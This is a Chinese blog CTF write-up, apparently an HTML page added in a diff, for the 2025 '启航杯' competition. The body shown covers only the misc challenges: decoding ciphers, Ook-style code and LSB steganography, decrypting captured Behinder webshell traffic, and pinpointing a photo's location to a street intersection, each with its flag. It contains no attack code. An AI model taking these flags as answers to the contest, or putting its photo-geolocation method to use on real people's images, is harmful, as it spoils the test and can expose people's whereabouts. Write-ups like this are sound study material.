@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.boychai.xyz","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/google-dark","dark":"base16/google-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="解题情况  最终排名19，22道题目，20解，一道社工的你猜猜这是哪和取证的Win_06没解出来，题目质量并不高。其中逆向、密码均为wheeler大佬提供的wp，猿类的语言的wp为beginner大佬提供。  MISC QHCTF For Year 2025 根据提示画图080714212829302316092230-04111825121306132027-0605041118252627-0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025第一届“启航杯”网络安全挑战赛-WriteUp">
+<meta property="og:url" content="https://blog.boychai.xyz/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/index.html">
+<meta property="og:site_name" content="BoyChai&#39;s Blog">
+<meta property="og:description" content="解题情况  最终排名19，22道题目，20解，一道社工的你猜猜这是哪和取证的Win_06没解出来，题目质量并不高。其中逆向、密码均为wheeler大佬提供的wp，猿类的语言的wp为beginner大佬提供。  MISC QHCTF For Year 2025 根据提示画图080714212829302316092230-04111825121306132027-0605041118252627-0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.boychai.xyz/article/25-qihang-chengji.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/cdff51d8824765572d36cae578564d4.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125211946.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125212422.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125213511.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/cd276cdc6c71e3a6e9a19cd11d59e4e.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125213815.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125213937.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125214124.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125214436.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125222853.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125222857.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/2ce8f40c86e37733b195c277b71db74.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125223556.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125223621.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250126193202.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125223120.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125223211.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125223215.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125215219.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125215336.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125220908.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125221007.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125221543.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125222104.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/9918f27c816ff00ba5c0179aea4a073.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125222258.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/c2e5c331548c422e68de5d448f4b9f6.png">
+<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250125221906.png">
+<meta property="article:published_time" content="2025-01-26T19:02:00.000Z">
+<meta property="article:modified_time" content="2025-07-17T05:40:18.597Z">
+<meta property="article:author" content="BoyChai">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="CRYPTO">
+<meta property="article:tag" content="MISC">
+<meta property="article:tag" content="REVERSE">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Forensics">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.boychai.xyz/article/25-qihang-chengji.png">
+
+
+<link rel="canonical" href="https://blog.boychai.xyz/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.boychai.xyz/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/","path":"2025/01/26/2025第一届“启航杯”网络安全挑战赛-WriteUp/","title":"2025第一届“启航杯”网络安全挑战赛-WriteUp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2025第一届“启航杯”网络安全挑战赛-WriteUp | BoyChai's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="dns-prefetch" href="waline-server-ten-phi.vercel.app">
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="BoyChai's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband">
+  <a target="_blank" rel="noopener" href="https://github.com/boychai" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  </div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">BoyChai's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-开往"><a href="https://www.travellings.cn/go.html" rel="section" target="_blank"><i class="fa fa-car fa-fw"></i>开往</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="nav-number">1.</span> <span class="nav-text">解题情况</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#QHCTF-For-Year-2025"><span class="nav-number">2.1.</span> <span class="nav-text">QHCTF For Year 2025</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%EF%BC%81"><span class="nav-number">2.2.</span> <span class="nav-text">______启动！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E7%9C%8B%E6%87%82%E8%BF%99%E4%B8%B2%E6%9C%AA%E7%9F%A5%E7%9A%84%E6%96%87%E5%AD%97%E5%90%97"><span class="nav-number">2.3.</span> <span class="nav-text">你能看懂这串未知的文字吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%B7%E6%89%BE%E5%87%BA%E6%8B%8D%E6%91%84%E5%9C%B0%E6%89%80%E5%9C%A8%E4%BD%8D%E7%BD%AE"><span class="nav-number">2.4.</span> <span class="nav-text">请找出拍摄地所在位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PvzHE"><span class="nav-number">2.5.</span> <span class="nav-text">PvzHE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%BF%E7%B1%BB%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E4%BD%A0%E4%BA%86%E8%A7%A3%E5%90%97"><span class="nav-number">2.6.</span> <span class="nav-text">猿类的编程语言你了解吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E7%8C%9C%E7%8C%9C%E6%88%91%E5%9C%A8%E5%93%AA"><span class="nav-number">2.7.</span> <span class="nav-text">你猜猜我在哪</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-RSA"><span class="nav-number">3.1.</span> <span class="nav-text">Easy_RSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">4.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-pwn"><span class="nav-number">4.1.</span> <span class="nav-text">Easy_pwn</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">5.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Checker"><span class="nav-number">5.1.</span> <span class="nav-text">Checker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rainbow"><span class="nav-number">5.2.</span> <span class="nav-text">rainbow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note"><span class="nav-number">5.3.</span> <span class="nav-text">note</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">6.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-include"><span class="nav-number">6.1.</span> <span class="nav-text">Easy_include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PCREMagic"><span class="nav-number">6.2.</span> <span class="nav-text">PCREMagic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-IP"><span class="nav-number">6.3.</span> <span class="nav-text">Web_IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-pop"><span class="nav-number">6.4.</span> <span class="nav-text">Web_pop</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensics"><span class="nav-number">7.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%8A%A8%E6%80%81%E5%8F%96%E8%AF%81"><span class="nav-number">7.1.</span> <span class="nav-text">关于动态取证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Win-01"><span class="nav-number">7.2.</span> <span class="nav-text">Win_01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Win-02"><span class="nav-number">7.3.</span> <span class="nav-text">Win_02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Win-04"><span class="nav-number">7.4.</span> <span class="nav-text">Win_04</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Win-05"><span class="nav-number">7.5.</span> <span class="nav-text">Win_05</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Win-07"><span class="nav-number">7.6.</span> <span class="nav-text">Win_07</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BoyChai"
+      src="https://avatars.githubusercontent.com/u/88495409?s=96&v=4">
+  <p class="site-author-name" itemprop="name">BoyChai</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">75</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BoyChai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BoyChai" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@boychai.xyz" title="E-Mail → mailto:admin@boychai.xyz" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/277637284" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;277637284" rel="noopener me" target="_blank"><i class="fab fa-bilibili fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.boychai.xyz/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/88495409?s=96&v=4">
+      <meta itemprop="name" content="BoyChai">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoyChai's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2025第一届“启航杯”网络安全挑战赛-WriteUp | BoyChai's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2025第一届“启航杯”网络安全挑战赛-WriteUp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-26 19:02:00" itemprop="dateCreated datePublished" datetime="2025-01-26T19:02:00+00:00">2025-01-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">CTF相关</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF%E7%9B%B8%E5%85%B3/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/01/26/2025%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%90%AF%E8%88%AA%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-WriteUp/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><p><img src="https://image.boychai.xyz/article/25-qihang-chengji.png"><br>最终排名19，22道题目，20解，一道社工的<code>你猜猜这是哪</code>和取证的<code>Win_06</code>没解出来，题目质量并不高。其中逆向、密码均为<code>wheeler</code>大佬提供的wp，猿类的语言的wp为<code>beginner</code>大佬提供。</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="QHCTF-For-Year-2025"><a href="#QHCTF-For-Year-2025" class="headerlink" title="QHCTF For Year 2025"></a>QHCTF For Year 2025</h2><p>根据提示画图<code>080714212829302316092230-04111825121306132027-0605041118252627-08091009162330-0102031516170108152229-0108142229-0203041617180209162330-0108152229303124171003-231609021725181104-01020917233029</code><br><img src="https://image.boychai.xyz/article/cdff51d8824765572d36cae578564d4.png"><br>FLAG为<code>QHCTF&#123;FUN&#125;</code></p>
+<h2 id="启动！"><a href="#启动！" class="headerlink" title="______启动！"></a>______启动！</h2><p>挨个查看了一下流量，基本上都是加密的，最有线索的是流135，很像是webshell的流量，但是最终返回的是403，自己解密拿不到内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125211946.png"><br>感觉像是冰蝎的流量，通过<code>PuzzleSolver</code>解密出下面内容，他是冰蝎4的流量<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125212422.png"><br>通过豆包解密<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125213511.png"><br>flag为<code>QHCTF&#123;69b62b46-de2f-4ac2-81f7-234613d25cfb&#125;</code></p>
+<h2 id="你能看懂这串未知的文字吗"><a href="#你能看懂这串未知的文字吗" class="headerlink" title="你能看懂这串未知的文字吗"></a>你能看懂这串未知的文字吗</h2><p>翻了好多，找到一个差不多的，羊文<br><img src="https://image.boychai.xyz/article/cd276cdc6c71e3a6e9a19cd11d59e4e.png">解密拿到内容<code>szfpguwizgwesqzoaoerv</code>,直接提交是失败的，继续从图片中找内容，发现有一个lsb隐写<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125213815.png"><br>拿到lsb的字符串<code>qihangbeiiseasy</code>，之后使用维吉尼亚密码尝试解密拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125213937.png"><br><code>cryptoveryeasybysheep</code>,在羊文图中后面有三个<code>!</code>,加上即可<br>flag为<code>QHCTF&#123;cryptoveryeasybysheep!!!&#125;</code></p>
+<h2 id="请找出拍摄地所在位置"><a href="#请找出拍摄地所在位置" class="headerlink" title="请找出拍摄地所在位置"></a>请找出拍摄地所在位置</h2><p>图片内如如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125214124.png"><br>根据可用信息<code>绿源</code>、<code>雅迪</code>、<code>洋丰复合肥</code>、<code>柳化复合肥</code>去地图中挨个找。<br>找到下面地址<code>https://j.map.baidu.com/74/OpSi</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125214436.png"><br>flag为<code>QHCTF&#123;广西壮族自治区柳州市柳城县榕泉路与六广路交叉口&#125;</code></p>
+<h2 id="PvzHE"><a href="#PvzHE" class="headerlink" title="PvzHE"></a>PvzHE</h2><p>纸老虎，直接按日期排序，最早的图片中就有flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125222853.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125222857.png"></p>
+<h2 id="猿类的编程语言你了解吗"><a href="#猿类的编程语言你了解吗" class="headerlink" title="猿类的编程语言你了解吗"></a>猿类的编程语言你了解吗</h2><p><img src="https://image.boychai.xyz/article/2ce8f40c86e37733b195c277b71db74.png"><br>用工具jphs出了，原来的其他隐写工具没出来<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223556.png"><br>seek后出来一个okk码</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. .. .. .. .. .. .. .. .. .. !? .? .. .? .. .. .. .? .. .. .. .. .. .. .. .? .. .. .. .. .. .. .. .. .. .. ?. ?. ?. ?. !! ?! .? .? .? .. .. .. .. .. .. .. .. .. .. .. !. !! !! !! !! !! !! !! !! !! !. !! !! !! !! !! !. .? !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !. ?. .. .. .. !. .? .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !. ?. ?. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !. .? .? !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !. ?. ?. .. .. .. !. !. .? .? !. ?. ?. !! !! !! !! !! !. .? .? .. !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !. .? .? !! !! !! !! !. ?. ?. .. .. .. .. .. .. .. .. !. .? .? !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !! !! !! !! !! !. .. .. .. .. .. .. .. !. !! !! !! !! !. .? .? .. .. .. .. !. !! !! !! !! !. ?. ?. !! !! !! !. .. .. .. .. .. .. .. .. .. .. .. !. !! !! !! !! !! !! !! !! !. .? .? .. .. .. .. .. !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !. .? .? !! !! !! !! !. .. !. ?. ?. .. .. .. .. .. .. !. .. .. .. !. !! !! !! !! !! !! !. .. .. .. !. .? .? !! !! !. ?. ?. !! !! !! !. .? .? .. .. .. .. !. !! !! !! !! !. ?. ?. .. .. .. !. .. .. .. .. .. .. !. .? .? .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !.</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250125223621.png"><br>解密拿到flag</p>
